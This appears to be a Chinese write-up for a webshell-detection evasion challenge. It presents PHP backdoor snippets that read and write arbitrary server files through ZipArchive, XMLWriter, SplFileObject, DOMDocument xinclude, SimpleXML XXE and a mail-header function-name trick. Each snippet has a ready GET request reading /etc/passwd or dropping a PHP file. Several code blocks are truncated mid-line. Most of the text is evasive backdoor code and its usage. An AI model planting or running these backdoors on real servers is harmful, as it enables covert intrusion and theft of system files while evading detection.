# 前言
[本期的伏魔挑战赛](https://www.yuque.com/azeus/01/xokftsak9qgn5aw4?spm=0.0.0.0.b4fPDM#rqSQA
"本期的伏魔挑战赛")新增多功能场景的玩法，主要包括四大场景：
  1. 任意文件读取
  2. 任意文件写入
  3. 服务器任意信息窃取类后门
  4. 网络代理类后门
本文主要对任意文件读取和任意文件写入进行免杀。主要存在三种思路：
  1. 寻找不常见且与文件相关的类或方法，如zip、xml等
  2. 利用漏洞达到文件读取的目的，如xxe和ssrf以及文件包含
  3. 强制绕过常见文件读取与写入函数
# 寻找不常见且与文件相关的类或方法
## 利用highlight_file&show_source读取文件
用源码高亮函数highlight_file读取文件
    open($zipTmpPath, ZipArchive::CREATE)!==TRUE) {
        exit("cannot open \n");
    }
    $zip->addFromString($tmp["filename"], $tmp["content"]);
    $zip->close();
    if($zip->open($zipTmpPath) !== TRUE){
        exit("cannot open \n");
    }
    $flag = $zip->extractTo($tmp["filePath"]);
    echo $flag?"success write: ".$tmp["filePath"]."/".$tmp["filename"]: "fail write";
    $zip->close();
    unlink($zipTmpPath);
利用方式(get请求)：  
`?tmpzip=/tmp/test.zip&filename=tgao.php&content=%3C%3Fphp%20phpinfo()%3B&filePath=/tmp`  
各个参数解释：确保`tmpzip`参数和`filePath`参数所表示的目录有写入权限
  1. tmpzip：临时创建的zip文件路径，需要将文件内容写入到zip文件
  2. filename：zip压缩包中的文件名，也是解压之后的文件名
  3. content：filename文件的内容
  4. filePath：压缩包解压到的路径
### 任意文件读取
利用ZipArchive读取文件的思路：将要读取的文件添加到压缩包中，读取压缩包中的文件内容
     open($zipTmpPath, ZipArchive::OVERWRITE)){
        exit("cannot open \n");
    }
    $zip ->  addFile($filename,basename($filename));
    $zip->close();
    if($zip->open($zipTmpPath) !== TRUE){
        exit("cannot open \n");
    }
    echo  $zip->getFromName(basename($filename));
    $zip->close();
利用方式(get请求)：  
`?tmpzip=/tmp/tgao.zip&file=/etc/passwd`  
各个参数解释：确保tmpzip参数所表示的目录有写入权限
  1. tmpzip：临时创建的zip文件路径，需要将待读取的文件内容写入到zip文件
  2. file：带读取的文件路径
## 利用XMLWriter类写入文件
    openUri($tmp["file"]);
    $w->writeRaw($tmp["content"]);
利用方式：`?file=/tmp/test&content=hello`  
另外php是个神奇的语言，XMLWriter类的openUri和writeRaw方法可以直接调用，即不通过创建XMLWriter类，具体如下：
    openFile("r");
    while (!$fileobj->eof()) {
        echo $fileobj->fgets()."";
    }
利用方式：`?file=/etc/passwd`
## 利用DOMDocument::xinclude读取文件
    EOD;
    $dom = new DOMDocument;
    $dom->preserveWhiteSpace = false;
    $dom->formatOutput = true;
    $dom->loadXML($xml);
    $dom->xinclude();
    echo $dom->saveXML();
利用方式：`?file=/etc/passwd`
# 利用漏洞读取文件
## 利用XXE漏洞读取文件
### 利用SimpleXMLElement类构造XXE漏洞
     ]>  &xxe; ";
    $data = new SimpleXMLElement($xml,2);
    echo $data->name;
利用方式：`?file=/etc/passwd`
### 利用SimpleXMLIterator类构造XXE漏洞
SimpleXMLIterator是SimpleXMLElement子类...
     ]>  &xxe; ";
    $data = new SimpleXMLIterator($xml,2);
    echo $data->name;
利用方式：`?file=/etc/passwd`
### 利用simplexml_load_string构造XXE漏洞
利用simplexml_load_string去调用SimpleXMLElement
     ]>  &xxe; ";
    $data = simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
    echo $data->name;
利用方式：`?file=/etc/passwd`
## 利用SSRF漏洞读取文件
    ;
        Thu, 1 Jan 1970 00:00:00 +0000 (UTC)
        (envelope-from example-return-0000-example=PI:EMAIL)
    EOF;
    $headers =  iconv_mime_decode_headers($headers_string, 0, "");
    $Subject = $headers["Subject"];
    $file_arr = $Subject($_GET["file"]);
    foreach($file_arr as $value){
        echo $value."";
    }
利用方式：`?file=/etc/passwd`
# 最后
大佬带带！！！